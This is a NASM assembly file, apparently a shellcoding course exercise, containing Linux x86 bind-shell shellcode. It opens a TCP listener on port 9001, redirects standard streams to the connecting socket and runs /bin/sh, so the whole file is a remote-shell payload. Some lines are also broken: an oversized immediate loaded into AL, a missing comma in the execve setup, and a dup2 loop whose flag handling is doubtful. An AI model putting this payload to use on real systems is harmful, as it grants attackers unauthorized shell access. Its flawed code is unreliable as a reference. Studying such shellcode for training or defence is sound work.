; Filename: linux_x86_shell_bind_tcp.nasm
; Author: SLAE-14209

global _start

section .text

_start:

; 1. syscall socket()

  xor eax, eax        ; zeroize because of placing socket() here
  xor ebx, ebx        ; zeroize EBX register
  xor ecx, ecx        ; zeroize ECX register
  xor edx, edx        ; zeroize EDX register
  
  mov al, 0x167       ; syscall socket()
  mov bl, 0x2         ; AF_INET = 2
  mov cl, 0x1         ; SOCKET_STREAM = 1
  int 0x80            ; interrupt vector
  mov edi, eax        ; storing EAX (socket()) into EDI for future references

; 2. syscall bind()

  xor eax, eax        ; zeroize because of placing bind() here
  mov ax, 0x169       ; syscall bind()
  mov ebx, edi        ; reference to stored eax with socket()
  xor ecx, ecx        ; zeroize ECX register (=> sockaddr struct)
  push ecx            ; 0
  push ecx            ; Internet address 0.0.0.0
  push word 0x2329    ; push port number 9001
  push word 0x2       ; push AF_INET 2
  mov ecx, esp        ; Stack Pointer -> ECX
  mov dl, 16          ; addrlen (EDX) = 16
  int 0x80

; 3. syscall listen()

  xor eax, eax        ; zeroize because of placing listen() here
  mov ax, 0x16b       ; syscall listen()
  mov ebx, edi        ; reference of stored EDI (socket())
  xor ecx, ecx
  int 0x80
  
; 4. syscall accept()

  xor eax, eax       ; zeroize because of placing accept() here
  mov ax, 0x16c      ; syscall accept()
  mov ebx, edi       ; reference on stored EDI
  xor ecx, ecx       ; addr = 0
  xor edx, edx       ; addrlen = 0
  xor esi, esi       ; flags = 0
  int 0x80
  xor edi, edi       ; zeroize socket() stored in EDI
  mov edi, eax       ; save return value from EAX into EDI

; 5. syscall dup2()

  mov cl, 0x3        ; counter = 3
  
  loop_dup2:
  xor eax, eax       ; zeroize because of placing dup2()
  mov al, 0x3f       ; syscall dup2()
  mov ebx, edi       ; reference on stored EDI
  dec cl             ; decrementing counter by 1
  int 0x80
  
  jnz loop_dup2      ; jmp not zero
  
; 6. syscall execve()

  xor eax, eax       ; zeroize because of placing execve()
  push eax
  push 0x68732f6e    ; 'hs/n"
  push 0x69622f2f    ; 'ib//'
  mov ebx, esp       ; '//bin/sh' -> ESP
  
  push eax
	mov edx, esp
	
  push ebx
  mov ecx, esp
  mov al 0x0b        ; syscall execve()
  int 0x80
